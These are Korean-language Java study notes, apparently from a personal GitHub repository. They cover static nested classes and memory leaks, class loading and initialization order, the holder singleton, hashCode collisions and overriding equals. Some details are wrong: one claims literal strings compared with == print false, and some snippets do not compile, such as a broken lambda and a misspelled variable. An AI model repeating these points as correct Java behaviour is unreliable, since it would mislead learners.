<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/33.PNG" width="650" height="300" /><br><br>


```
위 사진을 보면 일반적인 inner 클래스와 다르게 static inner 클래스는 외부참조를 하고 있지
않은 것을 볼 수 있다.

외부참조가 없으니 정규화 된 this 기능도 사용하지 못하게 된다.

public class Outer_Class {
	int field = 10;
	int getField() {
		return field;
	}

	static class Inner_Class {
		int inner_field = 20;
		int getOuterfield() {
			return Outer_Class.this.getField() //컴파일 에러가 난다. static이 먼저니까
		}
	}
}

```
```
#) static inner 클래스는 메모리 누수가 없다.
위에서 아까 outofmemory 에러 났던걸 static 으로 해결해보자

class Outer_Class {
	private int[] data;

	//static 내부 클래스
	static class Inner_Class {

	}

	public Outer_Class(int size) {
		data = new int[size];
	}

	Inner_Class getInnerObject() {
		return new Inner_Class();
	}
}

public class Main {
	public static void main(String[] args) {
		ArrayList<Object> al = new ArrayList<>();
		for(int counter = 0; counter<50; counter++) {
			al.add(new Outer_Class(100000000).getInnerObject());
			System.out.println(counter);
		}
	}
}

//결과
1
2
..
49

종료 코드0(으)로 완료된 프로세스
```
```
위에서 아까 14번째에서 inner클래스에서는 outofmemory가 떴는데 static inner클래스는
아무 무리없이 모두 순회됨을 볼 수 있다.

정적멤버클래스는 외부 인스턴스 없이도 만들어질 수 있기 때문에 '외부참조' 가 존재하지 않게 되고,
이로인해 일회용으로 사용된 바깥 클래스 객체는 더이상 내부 클래스 객체와 아무런 관계가 아니게 되어
정상적으로 GC 수거 대상이 되어 메모리 관리가 잘된것이다.

정리하자면, inner 클래스를 선언할때 static 키워드를 붙여주지 않으면 '외부 참조' 현상 때문에, 
내부 클래스 인스턴스를 생성하기 위해 우선적으로 만들었던 외부 클래스 인스턴스가 정상적으로 GC 수거가 안되 메모리에 잔존하게 되어 문제점을 일으키게 된다. 
따라서 내부 클래스가 외부 클래스의 멤버를 가져와 사용하는 경우가 아닌 경우 반드시 내부 클래스를 선언 할 때는 static 키워드를 붙여주어야 한다

```
```
#)클래스로더
클래스로더는 컴파일된 자바의 클래스 파일(*.class)을 동적으로 로드하고, JVM의 메모리 영역인
Runtime Data Areas에 배치하는 작업을 수행한다.

클래스로더에서 class파일을 로딩하는 순서는 다음과 같이 3단계로 구성된다.


```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/34.PNG" width="650" height="300" /><br><br>

```
유의할 점은, 클래스를 메모리에 올리는 Loading 기능은 한번에 메모리에 올리지 않고,
어플리케이션에서 필요한 경우 동적으로 메모리에 적재하게 된다는 점이다.

사람들이 많이 착각하는 점이 위의 3가지 과정이 거의 동시에 이루어져서 같이 묶어 생각하는데,
엄연히 클래스로드(Loading)와 초기화(initialization)는 다른 작업이다.

그리고 클래스나 클래스 내의 static 멤버들을 소스를 실행하자마자 한번에 메모리에 모두 올라가는줄 착각하는데, 
곰곰히 생각해보면 언제 어디서 사용될지 모르는 static 멤버들을 처음에 전부 메모리에 올린다는건 비효율적이기 때문에,  
클래스 내의 멤버를 호출하게 되면 그때서야 클래스가 동적으로 메모리에 로드된다.

즉, JVM은 실행될때 모든 클래스를 메모리에 올려놓지 않고, 그때 마다 필요한 클래스를 메모리에 올려 효율적으로 관리하는 것이다.


```
```
#)클래스 로드 시점 파헤치기
클래스 로딩은 class loader가 .class파일을 찾고 JVM 메모리에 올려놓는 것을 의미한다.

클래스가 로드되었는지 안되었는지 확인하는 방법은, 콘솔에
> java -classpath 클래스파일위치 -verbose:class 클래스명

1. 아무것도 호출하지 호출하지 않을때
- 메인 메소드를 실행하였으니, 메인 메소드가 위치하고 있는 Main 클래스만 로드 된다.
- 아무리 static 멤버들이 있더라도 직접가져와 사용하지 않는 경우 Outer 클래스는 로드되지 않는다.
```
```
class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {

	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/35.PNG" width="650" height="300" /><br><br>

```
2. 인스턴스 생성할 때
- 클래스를 인스턴스화 하면 예상대로 당연히 클래스가 로드된다.
- 그러나 내부클래스는 직접 인스턴스를 생성하지 않으니 로드가 안된다.

class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		new Outer(); //클래스의 인스턴스 생성
	}
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/36.PNG" width="650" height="300" /><br><br>

```
3. static 변수 호출할 떄
- 클래스 내부의 static 멤버를 호출하면, 인스턴스화 하지 않아도 클래스가 도르된다.

class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		System.out.println(Outer.value); //정적변수출력
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/37.PNG" width="650" height="300" /><br><br>

```
4. static final 상수 호출
- 단, static final 상수를 호출할 경우 static 변수와 다르게 Outer클래스가 로드되지 않는다.
- 왜냐하면 상수는 JVM의 Method Area에 Constant Pool에 따로 저장되어 관리되기 떄문이다.


class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		System.out.println(Outer.VALUE); //정적 final 상수호출
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/38.PNG" width="650" height="300" /><br><br>

```
5. static 메소드 호출
- static 변수 호출한것과 같이 Outer 클래스가 로드된다.

class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		Outer.getInstance(); //static 메소드 호출
	}
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/39.PNG" width="650" height="300" /><br><br>


```
6. 내부클래스 호출
- 내부 클래스를 생성하기 위해선 외부 클래스를 먼저 생성하고 인스턴스화 해야하기 때문에
Outer 클래스와 Inner클래스 둘다 로드된다.
- 이러한 특징때문에 내부클래스를 static으로 선언하지 않고 인스턴스 멤버 클래스로서 사용하면
메모리 누수가 발생하게된다.


class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		new Outer().new Inner(); //내부 클래스 인스턴스화
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/40.PNG" width="650" height="300" /><br><br>

```
7. static 내부 클래스 호출
- static inner 클래스는 외부클래스를 생성하지않고 바로 직접 인스턴스화 가능하다.
- 그래서 일반 내부 클래스와는 달리 외부 클래스를 로드하지 않는다는 차이점이 있다.

Tip) static이 붙었다고 해서 static inner 클래스를 static 멤버나 static 메서드처럼 취급해서
생각하면 안된다.
inner클래스와 static inner 클래스의 차이는 외부클래스를 생성해야 내부클래스를 인스턴스를 할 수 있느냐
없느냐 차이일 뿐이다. 클래스를 초기화 해서 사용하는 것은 같다.


class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		new Outer.Holder(); //static 내부 클래스 인스턴스화
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/41.PNG" width="650" height="300" /><br><br>

```
8. static 내부 클래스의 static 변수 호출
- 마찬가지로 클래스를 인스턴스화 하지 않아도 static 멤버를 호출하면 Holder클래스가 로드된다.
- 그리고 외부 Outer클래스는 로드되지 않는다.

Tip) 이어서 static 내부 클래스의 static final 상수를 호출하면, 위에서 봤듯이
Outer 클래스와 그의 내부 클래스는 호출되지 않는다.(상수는 따로 관리)


class Outer {
	//static 변수
	static String value = "> Outer 클래스의 static 필드입니다.";

	//static final 상수
	static final String VALUE = "> Outer클래스의 static final 필드입니다.";

	Outer() {System.out.println("> Outer 생성자 초기화");}

	//static 메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}

	//inner클래스
	class Inner {
		Inner() {System.out.println("> Inner 생성자 초기화");}
	}

	//static Inner 클래스
	static class Holder {
		static String value = "> Holder 클래스의 static 필드입니다.";
		static final String VALUE = "> Holder 클래스의 static final 필드입니다.";

		Holder() {System.out.println("> Holder 생성자 초기화");}
	}
}

public class Main {
	public static void main(String[] args) {
		System.out.println(Outer.Holder.value); // static 내부 클래스 static 변수 호출
	}
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/42.PNG" width="650" height="300" /><br><br>

```
#) 클래스 초기화 시점 파헤치기
클래스초기화는 static블록과 static 멤버변수의 값을 할당하는 것을 의미한다.
꼭 new 생성자로 클래스를 인스턴스화 해야 클래스가 초기화 되는 것이 아니다.

클래스 로더에서 클래스 초기화 과정을 3단계로 나눠 설명하였지만, 사실 클래스 초기화(Initialization)는 클래스 로드(Loading) 시점과 거의 동시에 일어나기 때문에 같다고 보면 된다.

그래서 클래스 초기화 시점은 위의 클래스 로드 시점과 거의 똑같다. 위에서 클래스 로드 시점을 보여 주기위해 나눠 설명했지만 사실 클래스 초기화도 동시에 진행 된 것이라고 보면 된다.

예시를 들자면, 다음 코드를 보면 Outer클래스의 static 메소드를 호출하면, new생성자로 인스턴스화하지
않아도 클래스가 메모리에 로드되어 초기화 되는 것을 볼 수 있다.
```
```
아래에 static블록은 클래스가 로딩되고 클래스변수가 준비된 후 자동으로 실행되는 블록이다.

class Outer {
	// static 블록
    static {
        System.out.println("> Initializing class Outer");
    }
	
    // 생성자
    Outer() {
        System.out.println("> Outer 생성자 호출");
    }
	
    // 정적 메소드
    static void getInstance() {
        System.out.println("> Outer 클래스의 static 메서드 호출");
    }
}
public class Main {
    public static void main(String[] args) {
        Outer.getInstance(); // 정적 메소드 호출
    }
}


```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/43.PNG" width="650" height="300" /><br><br>

```
#)클래스 초기화 진행 순서
클래스 초기화 시점을 알았으니, 이번에는 클래스가 초기화되면 클래스 내부에서
어떤 멤버들이 어떤 순서대로 초기화가 순차적으로 진행되는지 알아보자

Tip) 코드상으로는 정적변수 선언문이 static블록보다 위에 위치해 있어서 먼저 초기화됬지만,
정확히 말하면 static필드변수와 static 블록의 초기화 순서는 코드선언순서에 따라 다르다.

class Outer {
	public static Object obj = new Print(); 

	static {
		System.out.println("2. 정적블록");
	}

	Outer() {
		System.out.println("3. 생성자");
	}
}
//정적변수가 초기화 됬음을 출력해주는 용도
class Print {
	Print() {
		System.out.println("1. 정적변수");
	}
}
public class Main {
	public static void main(String[] args) {
		new Outer();
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/44.PNG" width="650" height="300" /><br><br>

```
#)클래스로드와 초기화 분리하기
위에서 클래스로드와 초기화가 워낙 순식간에 일어나 동시에 실행한다고 하였지만,
그래도 클래스로더에서 봤다시피 엄연히 클래스가 메모리에 적재하는 과정은 나눠져있다.

이를 코드에서 확인하려면, Object 클래스의 getClass() 메서드를 통해 Class 클래스 객체를 가져오면된다.

class Outer {
	public String field = "> Outer 클래스의 필드 입니다!";

	//static 블록
	static {
		System.out.println("> Initializing class Outer");
	}

	//생성자
	Outer() {
		System.out.println("> Outer 생성자 호출");
	}

	//정적메서드
	static void getInstance() {
		System.out.println("> Outer 클래스의 static 메서드 호출");
	}
}
public class Main {
    public static void main(String[] args) throws Exception {

        System.out.println("1. 클래스 load만 : ");
        Class<? extends Outer> outerClass = Outer.class; // Outer 클래스의 Class 객체 리터럴로 가져오기

        System.out.println("\n---------------------------------------------------------------------\n");

        System.out.println("2. 클래스 initialization : ");
        Outer outer = outerClass.getDeclaredConstructor().newInstance(); // Reflection API로 클래스 생성 하기
        System.out.println(outer.field);
    }
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/45.PNG" width="650" height="300" /><br><br>

```
위의 코드에서 Outer클래스를 콘솔에서 로드했음에도(Outer.class) static블럭이나
생성자가 실행되지 않아 초기화 과정메시지가 출력안된것을 볼 수 있다.

즉, Outer.class 클래스 객체만 가져올 경우 클래스가 loading만 되며,
클래스 객체를 이용해 인스턴스화하면 그제서야 클래스가 initialization이 되는 걸,
점선 구분선을 통해 클래스 로딩과정이 분리 되었음을 볼 수 있다.
```
```
#)클래스 초기화는 오직 한번만 수행
클래스 초기화 작업은 오직 한번만 이행된다.

만일 멀티쓰레드 환경에서 여러개의 쓰레드가 동시에 클래스를 인스턴스화하여도 클래스 초기화는
오직한번만 수행된다.

정확히 말하면 클래스 로딩이 최초로 될때, 그때 한번만 초기화를 수행하고 그 이후에는 초기화를 스킾한다고 보면 된다.

이 의미는 멀티 스레드 환경에서 클래스 초기화 동작 자체는 스레드 세이프함을 의미한다.
```
```
class Outer {
	static {
		System.out.println("static 블록 호출");
	}
	public Outer() {
		System.out.println("생성자 호출");
	}
}
public class Main {
	public static void main(String[] args) {
		//1. 스레드 풀 생성
		ExecutorService serivce = Executors.newCachedThreadPool();

		//2. 반복문을 통해 10개의 스레드가 동시에 인스턴스 생성
		for(int i = 0; i<10; i++) {
			service.submit(() {
				new Outer();
			});
		}

		//3. 종료
		service.shutdown();
	}
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/46.PNG" width="650" height="300" /><br><br>

```
#) 싱글톤패턴
싱글톤클래스는 인스턴스를 오직 1개만 가지는 클래스를 말한다.

//싱글톤 객체
class Singleton {
	private Singleton() {}

	//static 내부 클래스를 이용
	private static class SingleInstanceHolder {
		private static final Singleton INSTANCE = new Singleton();
	}

	public static Singleton getInstance() {
		return SingleInstanceHolder.INSTANCE;
	}
}


내부클래스도 결국은 클래스이기 때문에 클래스가 로드될때 딱 한번만 초기화되는 특성을 이용하여
static final 상수에 싱글톤 객체를 할당하는 기법이다.

거기다 바로 위에서 살펴봤듯이 클래스 로딩 및 초기화 과정이 스레드 세이프함을 이용하여 
멀티 스레드 환경에서도 문제없이 싱글톤 인스턴스를 만들 수 있는 것이다.

아래는 실제로 멀티스레드 환경에서 싱글톤 객체가 하나만 생성되는지 확인하는 코드이다.

```
```
class Singleton {
	private Singleton() {

	}

	//static 내부 클래스를 이용
	private static class SingleInstanceHolder {
		private static final Singleton INSTANCE = new Singleton();
	}

	public static Singleton getInstance() {
		return SingleInstanceHolder.INSTANCE;
	}
}
public class Main {
	public static void main(String[] args) {
		//싱글톤 객체를 담을 배열
		Singleton[] singleton = new Singleton[10];

		//1. 스레드풀생성
		ExecutorService service = Executors.newCachedThreadPool();

		//2. 반복문을 통해 10개의 스레드가 동시에 인스턴스 생성
		for(int i = 0; i<10; i++) {
			final int num = i;
			service.submit(() -> {
				singleton[num] = Singleton.getInstance();
			});
		}

		//3. 종료
		service.shutdown();

		for(Singleton s : singleton) {
			System.out.println(s);
		} 
	}
}
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/47.PNG" width="650" height="300" /><br><br>

```
#)객체의 hashCOde는 고유하지 않다.
자바에서는 포인터를 철저히 숨겼기 때문에 직접적인 객체의 주소 원래값을 얻을수는 없다.
그래서 자바에서는 참조 변수의 주소값을 표현하기 위해 위와 같이 해시코드를 이용한다. 

보통 해싱 알고리즘 상 서로 다른 두 주소값을 가지고 있는 객체는 결코 같은 해시코드를 가질 수 없다. 
하지만 예외가 있는데, 바로 hashCode() 메서드가 int형 정수를 반환한다는 점이다.

public class Object {
	public native int hashCode(); //인터페이스 마냥 구현부가 없음
}

만일 자신의 컴퓨터가 32bit 사양이라면 이는 문제가 되지 않는다.(int가 32bit니까 잘릴수가없다.)
 
하지만 현대 시대에서 대부분 사용하는 64비트 컴퓨터에서 돌아가는 
JVM(가상머신)은 기본적으로 8바이트(64bit) 주소체계를 기본으로 하는데, 
만일 8바이트의 주소값을 hashCode를 이용해 반환하면 메서드의 타입에 따라 
4바이트(32bit)로 강제 캐스팅(long → int)이 되기 때문에 값이 겹칠수도 있다는 케이스가 존재하게 된다.
(이를 Hash Collisions 해시충돌이라 일컫는다)

그렇다면 hashCode 메서드의 반환 타입을 long 타입으로 반환되게 메소드를 업그레이드 하지 않은 이유는, 
기존에 int 타입형 메서드로서 여러 프로젝트에서 사용되고 있기 때문에 어쩔수 없이 호환성을 위해서
놔둔것으로 보면 된다

```
```
#)객체의 hashcode 중복확인해보기
다음은 서로 다른 객체일지라도 같은 해시코드를 반환할수 있다는 점을 확인하기 위한 예제 코드이다.

딕셔너리 형태의 자료형을 구현하기 위해 HashMap 클래스를 이용하였다.

루프문에서 먼저 값(value)으로 들어갈 새로 객체를 생성 하고, 
키(key)로 들어갈 생성한 객체의 해시코드를 얻는다. 
그리고 해당 해시코드 정수값이 HashMap에 이미 들어있는지 아닌지 검사를하고, 
동일한 해시 키값을 가진 데이터가 있으면 콘솔을 출력한다.

``` 
```
public class Test1 {
	public static void main(String[] args) {
		Map<Integer, Object> objectMap = new HashMap<>(); //{해시코드:객체} 형태의 Map
		int j = 1;

		//int형 범위(21억번) 돌림
		for(long i = Integer.MIN_VALUE; i<Integer.MAX_VALUE+1L; i++) {
			Object obj = new Object(); //객체생성
			int hashCode = obj.hashCode(); //해시코드 얻기

			//Map에 해당 해시코드가 존재하는지 확인(만일 있다면 출력)
			Object obj2 = objectMap.get(hashCode);
			if(obj2 != null) {
			System.out.println((i - Integer.MIN_VALUE + 1L) + "번째 루프");
                System.out.println("새롭게 만든 객체 해시코드 : " + obj.hashCode());
                System.out.println("기존에 있는 객체 해시코드 : " + obj2.hashCode());
                System.out.println("해시코드가 같아도 obj2 == obj 는 : " + (obj2.equals(obj))); // 해시코드가 같아도 객체의 주솟값은 원래 다르니 false 출력
                System.out.println("");
                
                if (j >= 4) return; // 4번만 출력
                j++;
            } else {
                objectMap.put(hashCode, obj); // Map에 해시코드와 객체 등록
            }
        }
    }
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/48.PNG" width="650" height="300" /><br><br>

```
결과는 보다시피 64비트 컴퓨터에서의 자바 프로그래밍에선, 
메서드 정의상 서로 다른 객체라도 같은 해시코드를 가지고 있을 수 있다는 점을 알 수 있다. 
(결과가 너무 많아 일부러 4번만 출력하도록 제한하였다)


```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/49.PNG" width="650" height="300" /><br><br>

```
#)equals 메소드
String s1 = "Hello";
String s2 = "Hello";

System.out.println(s1 == s2); //주소 비교 false
System.out.println(s1.equals(s2)); //값 비교 true

그러면 문자열이 아닌 클래스 자료혀으이 객체 데이터일 경우 equals 메소드를 어떻게 다뤄질까?
어렵게 생각할 필요없이 비교할 대상이 객체일 경우 객체의 주소를 이용하여 비교한다.

즉, 객체 자체를 비교할때는 == 나 equals() 나 똑같다고 보면된다.
```
```
class Person {
	String name;

	public Person(String name) {
		this.name = name;
	}

	public class Example {
		public static void main(String[] args) {
		
		Person person1 = new Person("홍길동");
        Person person2 = new Person("홍길동");

        System.out.println(person1 == person2); // == 은 객체타입인경우 주소값을 비교한다 서로다른 객체는 다른 주소를 가지고 있기 때문에 false가 출력됨

        System.out.println(person1.equals(person2)) // equals또한 객체타입인경우 주소값을
		비교하기 때문에 false가 출력된다.
		}
	}
}

```
```
#)equals 오버라이딩
위에서 잘 생각해보자. 위의 person1 변수와 person2 변수는 각기 다른 객체를 초기화하여
힙 영역에 따로 저장해두고 있으니 두 객체를 비교하면 주소가 일치하지 않아 당연히 false가 뜬다.

하지만 이는 컴퓨터적인 관점에서 바라본 입장이다.

외부적인 관점에서는 두 객체는 똑같은 Person 클래스 타입이고 똑같은 이름 값 "홍길동"을 지니고 있다.

즉, 사용 입장에서는 두 객체는 어찌보면 같은 데이터다 라고 볼 수도 있는 것이다. 물론 프로그램적인
입장에서는 둘은 다르다는 것이 옳지만, 데이터적인 입장에서는 둘은 어찌보면 같다고 봐야 할지도 모른다.
 
따라서 만일 객체 자료형을 비교를 할때, 
주소 값이 아닌 객체의 필드값을 기준으로 동등 비교 기준을 변경하고 싶다면, equals 메서드를
오버라이딩해서 주소가 아닌 필드값을 비교하도록 재정의 해주면 된다.
```

```
class Person {
	String name;

	public Person(String name) {
		this.name = name;
	}
	// 객체 주소 비교가 아닌 Person 객체의 사람 이름이 동등한지 비교로 재정의 하기 위해 오버라이딩
    public boolean equals(Object o) { //p2
		// 만일 현 객체 this와 매개변수 객체가 같을 경우 true
        if (this == o) return true;

		// 만일 매개변수 객체가 Person 타입과 호환되지 않으면 false
        if (!(o instanceof Person)) return false;

		// 만일 매개변수 객체가 Person 타입과 호환된다면 다운캐스팅(down casting) 진행 
        Person person = (Person) o;

		// this객체 이름과 매개변수 객체 이름이 같을경우 true, 다를 경우 false
        return Objects.equals(this.name, person.name);
    }
}

public class Main {
    public static void main(String[] args) {
        Person p1 = new Person("홍길동");
        Person p2 = new Person("홍길동"); // 동명이인

        System.out.println(p1.equals(p2)); // true
    }
}

```
```
[Objects 클래스]
Object 클래스가 아닌, Objects 클래스임을 조심하자.
Objects 클래스는 java.util 패키지에 있는 또다른 클래스이다. 
(Object 클래스는 java.lang 패키지에 포함)Objects 클래스는 객체 비교, 해시 코드 생성, null 여부,
객체 문자열 리턴 등의 연산을 수행하는 정적 메소드들로 구성되어 있으며, 
개발자가 가져가 쓰기 편하게 하기 위해서 구현되었다.
위의 코드에서 Object 클래스의 equals 메서드를 재정의 하였기 때문에, 
본래의 equals 메서드 동작 결과를 얻기 위해 Objects 클래스의 메서드를 사용하는 것이라고 이해하면 된다.


```
```
#)쉽게생각하자
1. == 로 비교했더니 주소로 비교하니까 다른 고유의 값으로 비교하도록 할 수 없나?..
2. 그러면 내가 직접 메서드 정의해서 써야지
3. 근데 부모클래스로 다룰때도 비교하는 메서드를 사용하고 싶은데(다형성)
4. 모든 클래스가 상속하는 최상의 클래스 Object에 미리 equals() 라는 메서드가 있으니
이걸 오버라이드해서 재활용하면 되지 않을까?

이러한 기법의 대표적인 예가 String 클래스의 euqals 메서드이다.

```
```
즉, 원래 String도 클래스(객체)이기 떄문에 equals도 주소를 비교하는 것이였지만 재정의한것이다.

원래 equals() 메서드는 객체의 주소값을 기준으로 동등 비교를 한다고 했었다. 
문자열을 저장하는 String 클래스도 사실 객체 타입이기 때문에 예외가 없다. 
즉, 원래대로라면 문자열 값이 아닌 주소값을 비교하게 되어있다. 
하지만 String의 equals() 메서드가 문자열 값으로 비교한 이유가, 
바로 위의 Person 클래스 예제와 같이 실제 자바의 String 클래스에도 
equals() 메소드를 살펴보면 다음과 같이 equals가 재정의 되어있어 그런 것이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/50.PNG" width="650" height="300" /><br><br>

```
#)hashCode 메서드
hashCode메서드는 객체의 주소값을 이용해서 해싱(hashing)기법을 통해
해시코드를 만든 후 반환한다.
그렇기 때문에 서로 다른 두 객체는 같은 해시코드를 가질 수 없게 된다.
그래서 해시코드는 객체의 지문이라고도 한다.

엄밀히 말하면 해시코드는 주소값이 아니라, 주소값으로 만든 고유한 숫자값이라고 하는게 좋다.

class Person {
	String name;

	public Person(String name) {
		this.name = name;
	}
}

public class Main {
	public static void main(String[] args) {
		Person p1 = new Person("홍길동");
		Person p2 = new Person("홍길동");

		//객체 인스턴스마다 각기 다른 주해시코드(주소)를 가지고 있다.
		System.out.println(p1.hashCode()); 622488023
		System.out.println(p2.hashCode()); 1933863327
	}
}
```

```
실제 Object클래스에 정의된 hashCode()메서드 정의를 보면 다음과 같다.

public class Object {
	public native int hashCode(); //인터페이스마냥 구현부가 없음
}

보지못한 생소한 native라는 키워드가 보이는데, 이 native 키워드가 들어간 메소드는
OS가 가지고 있는 메소드를 뜻한다.

JVM(자바 가상머신)에 대해 자세히 공부하신 독자 분이라면, JNI(Java Native Interface) 에 대해 들어본 적이 있을 것이다. 

JNI는 C나 저수준의 언어로 작성된 native 코드를 
JVM에 적재시키고 실행해주는 머신인데, 
바로 이 native 코드중 하나가 hashCode() 메서드이다.

이 네이티브 메서드는 OS에 C언어로 작성되어있어 그 안의 내용은 볼 수 없고, 오로지 사용만 할 수 있다.
